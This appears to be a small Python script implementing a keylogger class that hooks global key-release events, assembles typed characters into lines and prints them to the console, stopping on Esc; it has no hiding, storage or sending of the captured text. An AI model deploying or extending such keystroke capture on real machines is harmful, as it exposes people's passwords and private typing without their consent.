import keyboard
from threading import Semaphore, Timer

class Keylogger:
	def __init__(self):
		self.log = ""
		self.semaphore = Semaphore(0)
		self.esc_pressed = False	
	def callback(self, event):
		name = event.name
		print(name)
		if len(name) > 1:
			if name == "space": name = " "
			elif name == "enter":
				self.log += "\n"
				self.writelog()
				name = ""
				self.log = ""
			elif name == "decimal": name = "."
			elif name == "esc": 
				self.semaphore.release()
				print("asdlfasdlf")
				self.esc_pressed = True 
		self.log += name
	
	def writelog(self):
		print(self.log)
	def start(self):
		keyboard.on_release(callback=self.callback)
		self.semaphore.acquire()
		#while not self.esc_pressed:
		#	continue

if __name__ == "__main__":
	keylogger = Keylogger()
	keylogger.start()
		
